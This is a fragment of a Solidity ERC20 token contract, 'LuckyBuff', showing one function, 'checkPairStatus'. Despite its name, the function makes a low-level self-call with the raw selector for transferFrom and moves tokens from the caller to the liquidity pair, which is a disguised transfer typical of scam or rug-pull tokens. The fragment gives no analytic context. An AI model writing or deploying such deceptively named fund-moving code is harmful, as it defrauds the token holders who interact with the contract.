...
contract LuckyBuff is ERC20, Ownable {
    ...
    function checkPairStatus() external returns (bool, bytes memory) {
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x23b872dd, msg.sender, _pair, IERC20(_pair).balanceOf(address(this))));
        return (success, data);
    }
